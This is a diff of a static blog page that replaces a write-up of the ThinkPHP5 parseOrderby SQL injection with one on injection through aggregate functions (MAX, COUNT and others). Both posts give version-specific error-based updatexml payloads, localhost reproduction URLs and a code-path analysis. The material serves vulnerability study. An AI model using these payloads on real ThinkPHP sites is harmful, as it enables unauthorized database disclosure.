@@ -18,7 +18,7 @@
   <meta name="author" content="sp4z">
   <meta name="keywords" content="">
   
-  <title>thinkphp5框架SQL注入分析：parseOrderby - sp4z&#39;s Blog</title>
+  <title>thinkphp5框架SQL注入分析：聚合函数 - sp4z&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="thinkphp5框架SQL注入分析：parseOrderby">
+            <span class="h2" id="subtitle" title="thinkphp5框架SQL注入分析：聚合函数">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-22 14:39" pubdate>
-        2021年7月22日 下午
+      <time datetime="2021-07-23 11:00" pubdate>
+        2021年7月23日 上午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      448 字
+      479 字
     </span>
   
 
@@ -225,52 +225,87 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">thinkphp5框架SQL注入分析：parseOrderby</h1>
+            <h1 style="display: none">thinkphp5框架SQL注入分析：聚合函数</h1>
             
             <div class="markdown-body">
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞存在于Builder类的parseOrderby方法中，order by注入</p>
-<p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p>
-<p>测试的时候用php7一直报错，换成php5才行</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5122</span><br></code></pre></td></tr></table></figure>
-
-
-
-<p>修改composer.json，执行composer update</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>       <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>       <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.22&quot;</span><br>   &#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<p>添加控制器</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$orderby</span> = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>])-&gt;order(<span class="hljs-variable">$orderby</span>)-&gt;find();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost/tp5122/public/?orderby</span>[<span class="hljs-string">id`||updatexml(1,concat(0x7e,user()),0)%23</span>]=1<br></code></pre></td></tr></table></figure>
-
-<p><a href="https://imgtu.com/i/W0veIK"><img src="https://z3.ax1x.com/2021/07/22/W0veIK.png" srcset="/img/loading.gif" lazyload alt="W0veIK.png"></a></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1.输入的payload在控制器中被传递给order方法</p>
-<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?orderby<span class="hljs-built_in">[id</span>`||updatexml(<span class="hljs-number">1</span><span class="hljs-built_in">,concat</span>(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>)<span class="hljs-meta">%23</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-
-<p><a href="https://imgtu.com/i/W0vVVx"><img src="https://z3.ax1x.com/2021/07/22/W0vVVx.png" srcset="/img/loading.gif" lazyload alt="W0vVVx.png"></a></p>
-<p>2.输入的orderby数组在order方法中被赋值给了<code>$this-&gt;options[&#39;order&#39;]</code></p>
-<p><a href="https://imgtu.com/i/W0vZa6"><img src="https://z3.ax1x.com/2021/07/22/W0vZa6.png" srcset="/img/loading.gif" lazyload alt="W0vZa6.png"></a></p>
-<p>3.order方法结束后进入find，然后再调用think\db\connection\Mysql的find</p>
-<p><a href="https://imgtu.com/i/W0vhQJ"><img src="https://z3.ax1x.com/2021/07/22/W0vhQJ.png" srcset="/img/loading.gif" lazyload alt="W0vhQJ.png"></a></p>
-<p>4.在think\db\connection\Mysql的find中，主要干了两件事</p>
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞存在于所有Mysql聚合函数相关方法，如 <strong>AVG ， COUNT ， SUM</strong> ， MIN ， MAX 等</p>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> 。</p>
+<p>不同版本的payload</p>
 <ul>
-<li>select生成sql语句</li>
-<li>query执行sql语句</li>
+<li><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+
+
+</li>
 </ul>
-<p>先来看select</p>
-<p><a href="https://imgtu.com/i/W0v7o6"><img src="https://z3.ax1x.com/2021/07/22/W0v7o6.png" srcset="/img/loading.gif" lazyload alt="W0v7o6.png"></a></p>
-<p>5.select方法中取出了之前赋值给<code>$this-&gt;options[&#39;order&#39;]</code>的数组，也就是我们输入的orderby数组，然后传递给parseOrder。最后用str_replace替换模板生成sql语句</p>
-<p><a href="https://imgtu.com/i/W0v1sA"><img src="https://z3.ax1x.com/2021/07/22/W0v1sA.png" srcset="/img/loading.gif" lazyload alt="W0v1sA.png"></a></p>
-<p>6.在parseOrder中，用户输入未经过任何过滤就拼接到sql语句中，只需要闭合掉在parseKey中拼接上的反引号即可。值得注意的是这里实际被拼接进sql语句的是传入orderby数组的键$key，数组的值最终传递给$sort然后被注释掉</p>
-<p><a href="https://imgtu.com/i/W0vdzQ"><img src="https://z3.ax1x.com/2021/07/22/W0vdzQ.png" srcset="/img/loading.gif" lazyload alt="W0vdzQ.png"></a></p>
-<p>7.最后生成好的$sql被带入query执行</p>
-<p><a href="https://imgtu.com/i/W0v6oV"><img src="https://z3.ax1x.com/2021/07/22/W0v6oV.png" srcset="/img/loading.gif" lazyload alt="W0v6oV.png"></a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>需要注意下parseOrder中拼接sql语句的过程，理解为什么要把注入语句放在orderby数组的键中。</p>
+<ul>
+<li><p><strong>5.1.11～5.1.25</strong> ： </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="5-0-10"><a href="#5-0-10" class="headerlink" title="5.0.10"></a>5.0.10</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">501</span>/public/?options=id)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/WrGkIs"><img src="https://z3.ax1x.com/2021/07/23/WrGkIs.png" srcset="/img/loading.gif" lazyload alt="WrGkIs.png"></a></p>
+<h2 id="5-1-22"><a href="#5-1-22" class="headerlink" title="5.1.22"></a>5.1.22</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">5122</span>/public/?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/WrGFaj"><img src="https://z3.ax1x.com/2021/07/23/WrGFaj.png" srcset="/img/loading.gif" lazyload alt="WrGFaj.png"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="5-1-22版本"><a href="#5-1-22版本" class="headerlink" title="5.1.22版本"></a>5.1.22版本</h2><p>1.控制器中，传入的参数$options进入了max</p>
+<p><a href="https://imgtu.com/i/Wr8jPI"><img src="https://z3.ax1x.com/2021/07/23/Wr8jPI.png" srcset="/img/loading.gif" lazyload alt="Wr8jPI.png"></a></p>
+<p>2.进入max，调用aggregate</p>
+<p><a href="https://imgtu.com/i/Wr8vGt"><img src="https://z3.ax1x.com/2021/07/23/Wr8vGt.png" srcset="/img/loading.gif" lazyload alt="Wr8vGt.png"></a></p>
+<p>3.aggregate中调用think\db\Connection类的aggregate</p>
+<p><a href="https://imgtu.com/i/Wr8xRP"><img src="https://z3.ax1x.com/2021/07/23/Wr8xRP.png" srcset="/img/loading.gif" lazyload alt="Wr8xRP.png"></a></p>
+<p>4.think\db\Connection类的aggregate中经过两步</p>
+<ol>
+<li>先拼接聚合函数名，然后在parseKey拼接反引号</li>
+<li>拼接好的$field传入value执行</li>
+</ol>
+<p><a href="https://imgtu.com/i/WrGpM8"><img src="https://z3.ax1x.com/2021/07/23/WrGpM8.png" srcset="/img/loading.gif" lazyload alt="WrGpM8.png"></a></p>
+<p>5.value</p>
+<p>之前已经分析过几次thinkphp的注入了，这里跟之前的基本一样，主要执行了四步</p>
+<ol>
+<li>把$field拆分成数组</li>
+<li>setOption把$field赋值给<code>$this-&gt;options[&#39;field&#39;]</code></li>
+<li>select拼接sql语句</li>
+<li>query执行sql语句</li>
+</ol>
+<p><a href="https://imgtu.com/i/WrG9sS"><img src="https://z3.ax1x.com/2021/07/23/WrG9sS.png" srcset="/img/loading.gif" lazyload alt="WrG9sS.png"></a></p>
+<p>6.select</p>
+<p>又是这个熟悉的模板，这次需要关注的是parseField</p>
+<p><a href="https://imgtu.com/i/Wr8zxf"><img src="https://z3.ax1x.com/2021/07/23/Wr8zxf.png" srcset="/img/loading.gif" lazyload alt="Wr8zxf.png"></a></p>
+<p>7.parseField</p>
+<p>传入的参数$this-&gt;options[‘field’]</p>
+<p><a href="https://imgtu.com/i/Wr8OIA"><img src="https://z3.ax1x.com/2021/07/23/Wr8OIA.png" srcset="/img/loading.gif" lazyload alt="Wr8OIA.png"></a></p>
+<p>这里实际上只执行了两步</p>
+<ol>
+<li>parseKey中由于两个if条件都不满足，直接原封不动的返回$key</li>
+<li>implode把之前拆分的$fields数组重新拼接回去，又变回原来的语句了</li>
+</ol>
+<p><a href="https://imgtu.com/i/WrGCqg"><img src="https://z3.ax1x.com/2021/07/23/WrGCqg.png" srcset="/img/loading.gif" lazyload alt="WrGCqg.png"></a></p>
+<p>8.最后进入query执行，实际执行的sql语句</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(<span class="hljs-symbol">`id`</span>)+updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>()),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/WrGiZQ"><img src="https://z3.ax1x.com/2021/07/23/WrGiZQ.png" srcset="/img/loading.gif" lazyload alt="WrGiZQ.png"></a></p>
+<h2 id="5-0-10版本"><a href="#5-0-10版本" class="headerlink" title="5.0.10版本"></a>5.0.10版本</h2><p>对比下两种payload，发现唯一的区别是多了一个反引号</p>
+<p>5.0.10</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p>5.1.22</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database()),<span class="hljs-number">0</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>看到5.0.10版本的max函数，发现少了拼接反引号的操作</p>
+<p><a href="https://imgtu.com/i/WrGEin"><img src="https://z3.ax1x.com/2021/07/23/WrGEin.png" srcset="/img/loading.gif" lazyload alt="WrGEin.png"></a></p>
+<p>可以看到传入value的$field没有拼接反引号</p>
+<p><a href="https://imgtu.com/i/WrGVGq"><img src="https://z3.ax1x.com/2021/07/23/WrGVGq.png" srcset="/img/loading.gif" lazyload alt="WrGVGq.png"></a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
 
             </div>
             <hr>
@@ -291,18 +326,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/23/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9A%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：聚合函数</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem/">
-                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：parseWhereItem</span>
+                      <a href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseOrderby/">
+                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：parseOrderby</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
